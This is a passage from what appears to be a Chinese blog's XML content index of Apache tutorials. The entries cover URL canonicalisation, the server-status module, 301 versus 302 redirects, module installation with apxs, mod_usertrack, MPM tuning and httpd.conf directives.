&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;很重要的一点是，如果你的网站出现了URL规范化的问题，千万不能使用Google的网址删除反馈表，来要求删除其中的一个网址版本。比如说，你所要的是带有www的版本 http://www.domainname.com &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;你千万不能到Google的网站上填表，要求没有www的主页网址 http://domainname.com &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;被删除掉。因为那样做的话，你整个的域名有可能被删除6个月。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;当然，除了包含www和不包含www的两个版本以外，还有其他类型的URL规范化问题。比如有的时候，搜索引擎会去掉或加上网址尾端最后的斜线。有的时候会尝试把大写字母换成小写字母，有的时候可能尝试去掉会话ID（session ID）等等，这些都有可能造成网址规范化问题。]]></content>
      <tags>
        <tag>Apache</tag>
        <tag>LAMP</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[apache的server status 功能]]></title>
    <url>%2F2017%2F08%2F10%2FApache%2F13.%20apache%E7%9A%84server%20status%20%E5%8A%9F%E8%83%BD%2F</url>
    <content type="text"><![CDATA[apache的server status 功能&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;首先要查看，你的apache是否有相应的模块 1ls /usr/local/apache2/modules/mod_status.so &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;如果没有，请重新编译你的apache &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;加上 –enable-module=so , 然后再安装一下扩展模块 mod_status.so &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;如果你使用的是rpm包安装的apache，就无需做这一步了，因为rpm安装的是有该模块的。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;接下来，就需要配置你的apache了。 1vim http.conf &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;增加： 1LoadModule status_module modules/mod_status.so &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;还需要增加： 1234567ExtendedStatus OnSetHandler Server-statusOrder deny,allowDeny from allAllow from 192.168.111.36 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;为了安全期间，一定要做一个allow deny的规则。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;重启apache就可以使用这个功能了，查看方法：http://www.example.com/Server-status]]></content>
      <tags>
        <tag>Apache</tag>
        <tag>LAMP</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[HTTP返回码中301与302的区别]]></title>
    <url>%2F2017%2F08%2F10%2FApache%2F26.%20%20HTTP%E8%BF%94%E5%9B%9E%E7%A0%81%E4%B8%AD301%E4%B8%8E302%E7%9A%84%E5%8C%BA%E5%88%AB%2F</url>
    <content type="text"><![CDATA[HTTP返回码中301与302的区别一．官方说法&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;301，302 都是HTTP状态的编码，都代表着某个URL发生了转移，不同之处在于： &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;301 redirect: 301 代表永久性转移(Permanently Moved)。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;302 redirect: 302 代表暂时性转移(Temporarily Moved )。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;这是很官方的说法，那么它们的区别到底是什么呢？ 二．现实中的差异2.1.对于用户&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;301，302对用户来说没有区别，他们看到效果只是一个跳转，浏览器中旧的URL变成了新的URL。页面跳到了这个新的url指向的地方。 2.2.对于引擎及站长2.2.1 302&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;302转向可能会有URL规范化及网址劫持的问题。可能被搜索引擎判为可疑转向，甚至认为是作弊。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;网址规范化 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;参考：URL网址规范化 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;网址劫持 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;302重定向和网址劫持（URL hijacking）有什么关系呢？这要从搜索引擎如何处理302转向说起。从定义来说，从网址A做一个302重定向到网址B时，主机服务器的隐含意思是网址A随时有可能改主意，重新显示本身的内容或转向其他的地方。大部分的搜索引擎在大部分情况下，当收到302重定向时，一般只要去抓取目标网址就可以了，也就是说网址B。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;实际上如果搜索引擎在遇到302转向时，百分之百的都抓取目标网址B的话，就不用担心网址URL劫持了。问题就在于，有的时候搜索引擎，尤其是Google，并不能总是抓取目标网址。为什么呢？比如说，有的时候A网址很短，但是它做了一个302重定向到B网址，而B网址是一个很长的乱七八糟的URL网址，甚至还有可能包含一些问号之类的参数。很自然的，A网址更加用户友好，而B网址既难看，又不用户友好。这时Google很有可能会仍然显示网址A。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;由于搜索引擎排名算法只是程序而不是人，在遇到302重定向的时候，并不能像人一样的去准确判定哪一个网址更适当，这就造成了网址URL劫持的可能性。也就是说，一个不道德的人在他自己的网址A做一个302重定向到你的网址B，出于某种原因， Google搜索结果所显示的仍然是网址A，但是所用的网页内容却是你的网址B上的内容，这种情况就叫做网址URL劫持。你辛辛苦苦所写的内容就这样被别人偷走了。 2.2.2 301&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;当网页A用301重定向转到网页B时，搜索引擎可以肯定网页A永久的改变位置，或者说实际上不存在了，搜索引擎就会把网页B当作唯一有效目标。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;301的好处是: 没有网址规范化问题。 也很重要的，网页A的PR网页级别会传到网页B。 三．Apache中实现301、302方法一，url rewrite，mod_rewrite1234Rewriteengine on RewriteCond %&#123;HTTP_HOST&#125; ^cmp.soso.com [NC] RewriteRule ^/js/(.*) http://www.soso.com/js/$1 [R=301] ServerName cmp.soso.com &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;将cmp.soso.com中js目录的下所有访问重定向到http://www.soso.com/js/，指定跳转返回码为301。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;对于[R=301]的详解： &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;’redirect|R [=code]’ (强制重定向 redirect) &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;以http://thishost[:thisport]/(使新的URL成为一个URI) 为前缀的Substitution可以强制性执行一个外部重定向。 如果code没有指定，则产生一个HTTP响应代码302(临时性移动)。 如果需要使用在300-400范围内的其他响应代码，只需在此指定这个数值即可， 另外，还可以使用下列符号名称之一: temp (默认的), permanent, seeother. 用它可以把规范化的URL反馈给客户端，如, 重写``/~\’’为 ``/u/‘’，或对/u/user加上斜杠，等等。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;注意: 在使用这个标记时，必须确保该替换字段是一个有效的URL! 否则，它会指向一个无效的位置! 并且要记住，此标记本身只是对URL加上 http://thishost[:thisport]/的前缀，重写操作仍然会继续。 通常，你会希望停止重写操作而立即重定向，则还需要使用’L’标记. 方法二 Redirect ，涉及模块：mod_alias&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;例： 12345&lt;VirtualHost 10.1.146.163:80&gt; DocumentRoot /home/qmhball/web/mybranches/stat_3276/oa/ ServerName oalogin.com Redirect 301 /login.php http://www.soso.com &lt;/VirtualHost&gt; &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;将oalogin.com下对login.PHP的访问重定向到http://www.soso.com，返回码301。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;如果没有指定redirect的返回参数（例中的301），则默认重定向是”临时性的”(HTTP status 302)。]]></content>
      <tags>
        <tag>Apache</tag>
        <tag>LAMP</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[apache的扩展模块安装]]></title>
    <url>%2F2017%2F08%2F10%2FApache%2F14.%20apache%E7%9A%84%E6%89%A9%E5%B1%95%E6%A8%A1%E5%9D%97%E5%AE%89%E8%A3%85%2F</url>
    <content type="text"><![CDATA[apache的扩展模块安装&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;这个用到了apache的扩展工具 apxs &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;在使用这个功能之前，请先确认是否已经加载了 mod_so 模块，方法是： 1/usr/local/apache2/bin/httpd -l &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;在列出的内容中，如果有 mod_so 那么说明已经加载了该模块。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;下面，举个例子来演示一下，如何编译安装扩展模块，例如，我想增加 mod_status.so 这个模块 1/usr/local/apache2/bin/apxs -i -a -c mod_status.c &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;请注意，这里的mod_status.c 的路径一定要写对了，不然会报错，一般情况下，这个C文件在你的源码包下，比如： 1/usr/local/src/httpd-2.0.59/modules/generators/mod_status.c &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;编译的结果类似这样： 12345678910111213/usr/local/services/apache-2.0.59/build/libtool --silent --mode=compile gcc -prefer-pic -DAP_HAVE_DESIGNATED_INITIALIZER -DLINUX=2 -D_REENTRANT -D_GNU_SOURCE -g -O2 -pthread -I/usr/local/services/apache-2.0.59/include -I/usr/local/services/apache-2.0.59/include -I/usr/local/services/apache-2.0.59/include -c -o /root/httpd-2.0.64/modules/generators/mod_status.lo /root/httpd-2.0.64/modules/generators/mod_status.c &amp;&amp; touch /root/httpd-2.0.64/modules/generators/mod_status.slo/usr/local/services/apache-2.0.59/build/libtool --silent --mode=link gcc -o /root/httpd-2.0.64/modules/generators/mod_status.la -rpath /usr/local/services/apache-2.0.59/modules -module -avoid-version /root/httpd-2.0.64/modules/generators/mod_status.lo/usr/local/services/apache-2.0.59/build/instdso.sh SH_LIBTOOL='/usr/local/services/apache-2.0.59/build/libtool' /root/httpd-2.0.64/modules/generators/mod_status.la /usr/local/services/apache-2.0.59/modules/usr/local/services/apache-2.0.59/build/libtool --mode=install cp /root/httpd-2.0.64/modules/generators/mod_status.la /usr/local/services/apache-2.0.59/modules/cp /root/httpd-2.0.64/modules/generators/.libs/mod_status.so /usr/local/services/apache-2.0.59/modules/mod_status.socp /root/httpd-2.0.64/modules/generators/.libs/mod_status.lai /usr/local/services/apache-2.0.59/modules/mod_status.lacp /root/httpd-2.0.64/modules/generators/.libs/mod_status.a /usr/local/services/apache-2.0.59/modules/mod_status.aranlib /usr/local/services/apache-2.0.59/modules/mod_status.achmod 644 /usr/local/services/apache-2.0.59/modules/mod_status.aPATH="$PATH:/sbin" ldconfig -n /usr/local/services/apache-2.0.59/modules----------------------------------------------------------------------Libraries have been installed in: /usr/local/services/apache-2.0.59/modules &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;完成后，请看提示 Libraries have been installed in: 模块就会安装到这里了。]]></content>
      <tags>
        <tag>Apache</tag>
        <tag>LAMP</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Apache模块动态加载和静态加载]]></title>
    <url>%2F2017%2F08%2F10%2FApache%2F10.%20Apache%E6%A8%A1%E5%9D%97%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BD%E5%92%8C%E9%9D%99%E6%80%81%E5%8A%A0%E8%BD%BD%2F</url>
    <content type="text"><![CDATA[Apache模块动态加载和静态加载&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;以前对apache研究的不够深刻，甚至连模块的动态以及静态都搞不清楚。查了资料，基本上明了。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;静态，顾名思义就是apache本身不用干什么，不用动就可以使用模块。这就需要把模块都编译进apache的httpd文件中。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;动态，需要apache去调用这个模块，用哪个调用哪个，这种方式的前提是，需要告诉apache这些模块在哪里。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;现在apache版本都普遍都是2.0或者2.2了，针对apache2.x如何动态以及静态编译? &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;对于2.x版本来讲，编译apache的时候，只要加上 –enable-mods-shared=all 就可以动态的编译全部模块。安装完成后会在 apache2/modules 目录下多了很多模块文件。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;如果想静态加载所有模块，编译参数改成 –enable-mods=all]]></content>
      <tags>
        <tag>Apache</tag>
        <tag>LAMP</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[mod_usertrack.so 的扩展安装以及使用]]></title>
    <url>%2F2017%2F08%2F10%2FApache%2F16.%20mod_usertrack.so%20%E7%9A%84%E6%89%A9%E5%B1%95%E5%AE%89%E8%A3%85%E4%BB%A5%E5%8F%8A%E4%BD%BF%E7%94%A8%2F</url>
    <content type="text"><![CDATA[mod_usertrack.so 的扩展安装以及使用&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;mod_usertrack.so 是在用户首次来到当前网站的时候给用户种下一个唯一的cookie，这个cookie是用户首次来当前网站的IP地址加上一个随机字符串组成的。用这个IP加随机字符串来标识用户的唯一性。这样就可以区分同一个IP下的不同用户了。 1. mod_usertrack.so 的安装。&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;到apache的源码包下，找到 mod_usertrack.c ，默认会在 modules/metadata/ 下，如果找不到find一下。 1/usr/local/apache/bin/apxs -i -a -c mod_usertrack.c &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;这样就安装好了，安装好后，会自动在 httpd.conf 中增加一行： 1LoadModule usertrack_module modules/mod_usertrack.so &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;当然了，mod_usertrack.so 同样会安装到 modules/ 下 2. 配置httpd.conf 使用 mod_usertrack.so&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;在httpd.conf 中加入： 1234CookieTracking on # 打开cookietracking 功能CookieExpires "1 years" # 设置cookie失效日期CookieStyle Cookie # 设置cookie的样式CookieName 12345 # 自定义，可以不加该选项 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;然后修改日志格式 1LogFormat "%h %l %u %t \"%r\" %&gt;s %b \"%&#123;Referer&#125;i\" \"%&#123;User-Agent&#125;i\" %&#123;cookie&#125;n" combined &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;其实，就是在默认的日志格式中加入 %{cookie}n &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;如果，你只想针对某个虚拟主机生效，请把 123CookieTracking onCookieExpires "1 years"CookieStyle Cookie &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;以上三行加入到相关的虚拟主机配置段中。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;参考：http://www.chedong.com/blog/archives/001077.html]]></content>
      <tags>
        <tag>Apache</tag>
        <tag>LAMP</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[apache的两种工作模式详解]]></title>
    <url>%2F2017%2F08%2F10%2FApache%2F15.%20apache%E7%9A%84%E4%B8%A4%E7%A7%8D%E5%B7%A5%E4%BD%9C%E6%A8%A1%E5%BC%8F%E8%AF%A6%E8%A7%A3%2F</url>
    <content type="text"><![CDATA[apache的两种工作模式详解1、prefork.c模块(一个非线程型的、预派生的MPM)&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;prefork MPM 使用多个子进程，每个子进程只有一个线程。每个进程在某个确定的时间只能维持一个连接。在大多数平台上，Prefork MPM在效率上要比Worker MPM要高，但是内存使用大得多。prefork的无线程设计在某些情况下将比worker更有优势：他能够使用那些没有处理好线程安全的第三方模块，并 且对于那些线程调试困难的平台而言，他也更容易调试一些。 123456ServerLimit 20000StartServers 5MinSpareServers 5MaxSpareServers 10MaxClients 1000MaxRequestsPerChild 0 ServerLimit 2000：默认的MaxClient最大是256个线程,假如想配置更大的值，就的加上ServerLimit这个参数。20000是ServerLimit这个参数的最大值。假如需要更大，则必须编译apache,此前都是无需重新编译Apache。生效前提：必须放在其他指令的前面 StartServers 5：指定服务器启动时建立的子进程数量，prefork默认为5。 MinSpareServers 5：指定空闲子进程的最小数量，默认为5。假如当前空闲子进程数少于MinSpareServers ，那么Apache将以最大每秒一个的速度产生新的子进程。此参数不要设的太大。 MaxSpareServers 10：配置空闲子进程的最大数量，默认为10。假如当前有超过MaxSpareServers数量的空闲子进程，那么父进程将杀死多余的子进程。此参数不要设的太大。假如您将该指令的值配置为比MinSpareServers小，Apache将会自动将其修改成”MinSpareServers+1”。 MaxClients 256：限定同一时间客户端最大接入请求的数量，默认为256。任何超过MaxClients限制的请求都将进入等候队列,一旦一个链接被释放，队列中的请求将得到服务。要增大这个值，您必须同时增大ServerLimit 。 MaxRequestsPerChild 10000：每个子进程在其生存期内允许伺服的最大请求数量，默认为10000.到达MaxRequestsPerChild的限制后，子进程将会结束。假如MaxRequestsPerChild为”0”，子进程将永远不会结束。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;将MaxRequestsPerChild配置成非零值有两个好处： 能够防止(偶然的)内存泄漏无限进行，从而耗尽内存。 给进程一个有限寿命，从而有助于当服务器负载减轻的时候减少活动进程的数量(重生的机会)。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;工作方式： &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;一个单独的控制进程(父进程)负责产生子进程，这些子进程用于监听请求并作出应答。Apache总是试图保持一些备用的 (spare)或是空闲的子进程 用于迎接即将到来的请求。这样客户端就无需在得到服务前等候子进程的产生。在Unix系统中，父进程通常以root身份运行以便邦定80端口，而 Apache产生的子进程通常以一个低特权的用户运行。User和Group指令用于配置子进程的低特权用户。运行子进程的用户必须要对他所服务的内容有 读取的权限，但是对服务内容之外的其他资源必须拥有尽可能少的权限。 2、worker.c模块(支持混合的多线程多进程的多路处理模块)&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;worker MPM 使用多个子进程，每个子进程有多个线程。每个线程在某个确定的时间只能维持一个连接。通常来说，在一个高流量的HTTP服务器上，Worker MPM是个比较好的选择，因为Worker MPM的内存使用比Prefork MPM要低得多。但worker MPM也由不完善的地方，假如一个线程崩溃，整个进程就会连同其任何线程一起”死掉”.由于线程共享内存空间，所以一个程式在运行时必须被系统识别为”每个线程都是安全的”。 12345678ServerLimit 50ThreadLimit 200StartServers 5MaxClients 5000MinSpareThreads 25MaxSpareThreads 500ThreadsPerChild 100MaxRequestsPerChild 0 ServerLimit 16：服务器允许配置的进程数上限。这个指令和ThreadLimit结合使用配置了MaxClients最大允许配置的数值。任何在重启期间对这个指令的改变都将被忽略，但对MaxClients的修改却会生效。 ThreadLimit 64：每个子进程可配置的线程数上限。这个指令配置了每个子进程可配置的线程数ThreadsPerChild上限。任何在重启期间对这个指令的改变都将被忽略，但对ThreadsPerChild的修改却会生效。默认值是”64”. StartServers 3：服务器启动时建立的子进程数，默认值是”3”。 MinSpareThreads 75：最小空闲线程数,默认值是”75”。这个MPM将基于整个服务器监控空闲线程数。假如服务器中总的空闲线程数太少，子进程将产生新的空闲线程。 MaxSpareThreads 250：配置最大空闲线程数。默认值是”250”。这个MPM将基于整个服务器监控空闲线程数。假如服务器中总的空闲线程数太多，子进程将杀死多余的空闲线 程。MaxSpareThreads的取值范围是有限制的。Apache将按照如下限制自动修正您配置的值：worker需要其大于等于 MinSpareThreads加上ThreadsPerChild的和 MaxClients 400：允许同时伺服的最大接入请求数量(最大线程数量)。任何超过MaxClients限制的请求都将进入等候 队列。默认值是”400”,16 (ServerLimit)乘以25(ThreadsPerChild)的结果。因此要增加MaxClients的时候，您必须同时增加 ServerLimit的值。 ThreadsPerChild 25：每个子进程建立的常驻的执行线程数。默认值是25。子进程在启动时建立这些线程后就不再建立新的线程了。 MaxRequestsPerChild 0：配置每个子进程在其生存期内允许伺服的最大请求数量。到达MaxRequestsPerChild的限制后，子进程将会结束。假如MaxRequestsPerChild为”0”，子进程将永远不会结束。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;将MaxRequestsPerChild配置成非零值有两个好处： 能够防止(偶然的)内存泄漏无限进行，从而耗尽内存。 给进程一个有限寿命，从而有助于当服务器负载减轻的时候减少活动进程的数量(重生的机会)。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;注意：对于KeepAlive链接，只有第一个请求会被计数。事实上，他改变了每个子进程限制最大链接数量的行为。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;工作方式： &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;每个进程能够拥有的线程数量是固定的。服务器会根据负载情况增加或减少进程数量。一个单独的控制进程(父进程)负责子进程的建 立。每个子进程能够建立 ThreadsPerChild数量的服务线程和一个监听线程，该监听线程监听接入请求并将其传递给服务线程处理和应答。Apache总是试图维持一个备 用(spare)或是空闲的服务线程池。这样，客户端无须等待新线程或新进程的建立即可得到处理。在Unix中，为了能够绑定80端口，父进程一般都是以 root身份启动，随后，Apache以较低权限的用户建立子进程和线程。User和Group指令用于配置Apache子进程的权限。虽然子进程必须对 其提供的内容拥有读权限，但应该尽可能给予他较少的特权。另外，除非使用了suexec ，否则，这些指令配置的权限将被CGI脚本所继承。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;硬限制： ServerLimi和ThreadLimit这两个指令决定了活动子进程数量和每个子进程中线程数量的硬限制。要想改变这个硬限制必须完全停止服务器然后再启动服务器(直接重启是不行的)。 Apache在编译ServerLimit时内部有一个硬性的限制，您不能超越这个限制。 prefork MPM最大为”ServerLimit 200000” 其他MPM(包括work MPM)最大为”ServerLimit 20000 Apache在编译ThreadLimit时内部有一个硬性的限制，您不能超越这个限制。 mpm_winnt是”ThreadLimit 15000” 其他MPM(包括work prefork)为”ThreadLimit 20000 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;注意：使用ServerLimit和ThreadLimit时要特别当心。假如将ServerLimit和ThreadLimit配置成一个高出实际需要许多的值，将会有过多的共享内存被分配。当配置成超过系统的处理能力，Apache可能无法启动，或系统将变得不稳定。]]></content>
      <tags>
        <tag>Apache</tag>
        <tag>LAMP</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Apache 的 httpd.conf 详解]]></title>
    <url>%2F2017%2F08%2F10%2FApache%2F2.%20Apache%20%E7%9A%84%20httpd.conf%20%E8%AF%A6%E8%A7%A3%2F</url>
    <content type="text"><![CDATA[Apache 的 httpd.conf 详解1ServerRoot “/usr/local“ &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;ServerRoot用于指定守护进程httpd的运行目录，httpd在启动之后将自动将进程的当前目录改变为这个目录，因此如果设置文件中指定的文件或目录是相对路径，那么真实路径就位于这个ServerR oot定义的路径之下。 1ScoreBoardFile /var/run/httpd.scoreboard &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;httpd使用ScoreBoardFile来维护进程的内部数据，因此通常不需要改变这个参数，除非管理员想在一台计算机上运行几个Apache服务器，这时每个Apache服务器都需要独立的设置文件htt pd.conf，并使用不同的ScoreBoardFile。 12#ResourceConfig conf/srm.conf#AccessConfig conf/access.conf &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;这两个参数ResourceConfig和AccessConfig，就用于和使用srm.conf和access.conf设置文件的老版本Apache兼容。如果没有兼容的需要，可以将对应的设置文件指定为/dev/null，这将表示不存在其他设置文件，而仅使用httpd.conf一个文件来保存所有的设置选项。 1PidFile /var/run/httpd.pid &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;PidFile指定的文件将记录httpd守护进程的进程号，由于httpd能自动复制其自身，因此系统中有多个httpd进程，但只有一个进程为最初启动的进程，它为其他进程的父进程，对这个进程发送信号将影响所有的httpd进程。PidFILE定义的文件中就记录httpd父进程的进程号。 1Timeout 300 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;Timeout定义客户程序和服务器连接的超时间隔，超过这个时间间隔（秒）后服务器将断开与客户机的连接。 1KeepAlive On &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;在HTTP 1.0中，一次连接只能作传输一次HTTP请求，而KeepAlive参数用于支持HTTP 1.1版本的一次连接、多次传输功能，这样就可以在一次连接中传递多个HTTP请求。虽然只有较新的浏览器才支持这个功能，但还是打开使用这个选项。 1MaxKeepAliveRequests 100 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;MaxKeepAliveRequests为一次连接可以进行的HTTP请求的最大请求次数。将其值设为0将支持在一次连接内进行无限次的传输请求。事实上没有客户程序在一次连接中请求太多的页面，通常达不到这个上限就完成连接了。 1KeepAliveTimeout 15 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;KeepAliveTimeout测试一次连接中的多次请求传输之间的时间，如果服务器已经完成了一次请求，但一直没有接收到客户程序的下一次请求，在间隔超过了这个参数设置的值之后，服务器就断开连接。 1ThreadsPerChild 50 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;设置服务器使用进程的数目。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;这是以服务器的响应速度为准的, 数目太大则会变慢 1MaxRequestsPerChild 30 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;使用子进程的方式提供服务的Web服务，常用的方式是一个子进程为一次连接服务，这样造成的问题就是每次连接都需要生成、退出子进程的系统操作，使得这些额外的处理过程占据了计算机的大量处理能力。因此最好的方式是一个子进程可以为多次连接请求服务，这样就不需要这些生成、退出进程的系统消耗，Apache就采用了这样的方式，一次连接结束后，子进程并不退出，而是停留在系统中等待下一次服务请求，这样就极大的提高了性能。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;但由于在处理过程中子进程要不断的申请和释放内存，次数多了就会造成一些内存垃圾，就会影响系统的稳定性，并且影响系统资源的有效利用。因此在一个副本处理过一定次数的请求之后，就可以让这个子进程副本退出，再从原始的htt pd进程中重新复制一个干净的副本，这样就能提高系统的稳定性。这样，每个子进程处理服务请求次数由MaxRe questPerChild定义。 缺省的设置值为30，这个值对于具备高稳定性特点的FreeBSD系统来讲是过于保守的设置，可以设置为1000甚至更高，设置为0支持每个副本进行无限次的服务处理。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;为了安全,设置为零 123#Listen 3000#Listen 12.34.56.78:80#BindAddress * &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;Listen参数可以指定服务器除了监视标准的80端口之外，还监视其他端口的HTTP请求。由于FreeBSD系统可以同时拥有多个IP地址，因此也可以指定服务器只听取对某个BindAddress&lt; /B&gt;的IP地址的HTTP请求。如果没有配置这一项，则服务器会回应对所有IP的请求。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;即使使用了BindAddress参数，使得服务器只回应对一个IP地址的请求，但是通过使用扩展的Listen参数，仍然可以让HTTP守护进程回应对其他IP地址的请求。此时Listen参数的用法与上面的第二个例子相同。这种比较复杂的用法主要用于设置虚拟主机。此后可以用VirtualHost参数定义对不同IP的虚拟主机，然而这种用法是较早的HTTP 1.0标准中设置虚拟主机的方法，每针对一个虚拟主机就需要一个IP地址，实际上用处并不大。在HTTP 1.1中，增加了对单IP地址多域名的虚拟主机的支持，使得虚拟主机的设置具备更大的意义。 1#ExtendedStatus On &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;Apache服务器可以通过特殊的HTTP请求，来报告自身的运行状态，打开这个ExtendedStatus 参数可以让服务器报告更全面的运行状态信息 1ServerAdmin you@your.address &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;配置文件中应该改变的也许只有ServerAdmin， 这一项用于配置WWW服务器的管理员的email地址，这将在HTTP服务出现错误的条件下返回给浏览器，以便让Web使用者和管理员联系，报告错误。习惯上使用服务器上的webmaster作为WWW服务器的管理员，通过邮件服务器的别名机制，将发送到webmaster 的电子邮件发送给真正的Web管理员。 1ServerName localhost &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;缺省情况下，并不需要指定这个ServerName参数，服务器将自动通过名字解析过程来获得自己的名字，但如果服务器的名字解析有问题（通常为反向解析不正确），或者没有正式的DNS名字，也可以在这里指定I P地址。当ServerName设置不正确的时候，服务器不能正常启动。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;通常一个Web服务器可以具有多个名字，客户浏览器可以使用所有这些名字或IP地址来访问这台服务器，但在没有定义虚拟主机的情况下，服务器总是以自己的正式名字回应浏览器。ServerName就定义了Web服务器自己承认的正式名字，例如一台服务器名字（在DNS中定义了A类型）为freebsd.exmaple.org.cn，同时为了方便记忆还定义了一个别名（CNAME记录）为www.exmaple.org.cn，那么Apache自动解析得到的名字就为freebsd.example.org.cn，这样不管客户浏览器使用哪个名字发送请求，服务器总是告诉客户程序自己为freebsd.example.org.cn。虽然这一般并不会造成什么问题，但是考虑到某一天服务器可能迁移到其他计算机上，而只想通过更改DNS中的www别名配置就完成迁移任务，所以不想让客户在其书签中使用 freebsd记录下这个服务器的地址，就必须使用ServerName来重新指定服务器的正式名字。 1DocumentRoot “/usr/local/www/data“ &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;DocumentRoot定义这个服务器对外发布的超文本文档存放的路径，客户程序请求的UR L就被映射为这个目录下的网页文件。这个目录下的子目录，以及使用符号连接指出的文件和目录都能被浏览器访问，只是要在URL上使用同样的相对目录名。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;注意，符号连接虽然逻辑上位于根文档目录之下，但实际上可以位于计算机上的任意目录中，因此可以使客户程序能访问那些根文档目录之外的目录，这在增加了灵活性的同时但减少了安全性。Apache在目录的访问控制中提供了FollowSymLinks选项来打开或关闭支持符号连接的特性。 1234&lt;Directory /&gt; Options FollowSymLinks AllowOverride None&lt;/Directory&gt; &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;Apache服务器可以针对目录进行文档的访问控制，然而访问控制可以通过两种方式来实现，一个是在设置文件 